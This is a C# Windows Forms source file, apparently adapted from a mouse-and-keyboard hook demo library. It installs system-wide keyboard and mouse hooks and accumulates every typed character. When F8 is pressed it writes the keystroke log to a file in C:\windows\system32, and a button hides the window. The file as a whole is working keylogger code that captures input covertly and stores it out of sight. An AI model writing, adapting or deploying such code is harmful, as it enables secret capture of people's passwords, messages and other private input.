using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace MouseKeyboardLibrary
{
    public partial class Form1 : Form
    {
        MouseHook mouseHook = new MouseHook();
        KeyboardHook keyboardHook = new KeyboardHook();
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            mouseHook.MouseMove += new MouseEventHandler(mouseHook_MouseMove);
            mouseHook.MouseDown += new MouseEventHandler(mouseHook_MouseDown);
            mouseHook.MouseUp += new MouseEventHandler(mouseHook_MouseUp);
            mouseHook.MouseWheel += new MouseEventHandler(mouseHook_MouseWheel);

            keyboardHook.KeyDown += new KeyEventHandler(keyboardHook_KeyDown);
            keyboardHook.KeyUp += new KeyEventHandler(keyboardHook_KeyUp);
            keyboardHook.KeyPress += new KeyPressEventHandler(keyboardHook_KeyPress);

            mouseHook.Start();
            keyboardHook.Start();

            SetXYLabel(MouseSimulator.X, MouseSimulator.Y);
        }
        void keyboardHook_KeyPress(object sender, KeyPressEventArgs e)
        {

            AddKeyboardEvent(
                "KeyPress",
                "",
                e.KeyChar.ToString(),
                "",
                "",
                ""
                );

        }

        void keyboardHook_KeyUp(object sender, KeyEventArgs e)
        {

            AddKeyboardEvent(
                "KeyUp",
                e.KeyCode.ToString(),
                "",
                e.Shift.ToString(),
                e.Alt.ToString(),
                e.Control.ToString()
                );

        }

        void keyboardHook_KeyDown(object sender, KeyEventArgs e)
        {


            AddKeyboardEvent(
                "KeyDown",
                e.KeyCode.ToString(),
                "",
                e.Shift.ToString(),
                e.Alt.ToString(),
                e.Control.ToString()
                );

        }

        void mouseHook_MouseWheel(object sender, MouseEventArgs e)
        {

            AddMouseEvent(
                "MouseWheel",
                "",
                "",
                "",
                e.Delta.ToString()
                );

        }

        void mouseHook_MouseUp(object sender, MouseEventArgs e)
        {


            AddMouseEvent(
                "MouseUp",
                e.Button.ToString(),
                e.X.ToString(),
                e.Y.ToString(),
                ""
                );

        }

        void mouseHook_MouseDown(object sender, MouseEventArgs e)
        {


            AddMouseEvent(
                "MouseDown",
                e.Button.ToString(),
                e.X.ToString(),
                e.Y.ToString(),
                ""
                );


        }

        void mouseHook_MouseMove(object sender, MouseEventArgs e)
        {

            SetXYLabel(e.X, e.Y);

        }

        void SetXYLabel(int x, int y)
        {

            curXYLabel.Text = String.Format("Current Mouse Point: X={0}, y={1}", x, y);

        }

        void AddMouseEvent(string eventType, string button, string x, string y, string delta)
        {

            listView1.Items.Insert(0,
                new ListViewItem(
                    new string[]{  
                        eventType,   
                        button,  
                        x,  
                        y,  
                        delta  
                    }));

        }

        void AddKeyboardEvent(string eventType, string keyCode, string keyChar, string shift, string alt, string control)
        {

            listView2.Items.Insert(0,
                 new ListViewItem(
                     new string[]{  
                        eventType,   
                        keyCode,  
                        keyChar,  
                        shift,  
                        alt,  
                        control  
                }));

            richTextBox1.Text += keyChar;

            if (keyCode == "F8")
            {
                FileStream fs = new FileStream("C:\\windows\\system32\\file.txt", FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter m_streamWriter = new StreamWriter(fs);
                m_streamWriter.Flush();  // 使用StreamWriter来往文件中写入内容
                m_streamWriter.BaseStream.Seek(0, SeekOrigin.Begin);
                // 把richTextBox1中的内容写入文件
                m_streamWriter.Write(richTextBox1.Text);
                //关闭此文件  m_streamWriter.Flush ( ) ;
                m_streamWriter.Close();
            }


        }

        private void TestForm_FormClosed(object sender, FormClosedEventArgs e)
        {

            // Not necessary anymore, will stop when application exits  

            //mouseHook.Stop();  
            //keyboardHook.Stop();  

        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            //FileStream fs = new FileStream("C:\\file.txt", FileMode.OpenOrCreate, FileAccess.Write);
            //StreamWriter m_streamWriter = new StreamWriter(fs);
            //m_streamWriter.Flush();  // 使用StreamWriter来往文件中写入内容
            //m_streamWriter.BaseStream.Seek(0, SeekOrigin.Begin);
            //// 把richTextBox1中的内容写入文件
            //m_streamWriter.Write(richTextBox1.Text);
            ////关闭此文件  m_streamWriter.Flush ( ) ;
            //m_streamWriter.Close();
        }

        private void RichTextBox1_TextChanged(object sender, EventArgs e)
        {

        }
    }
}
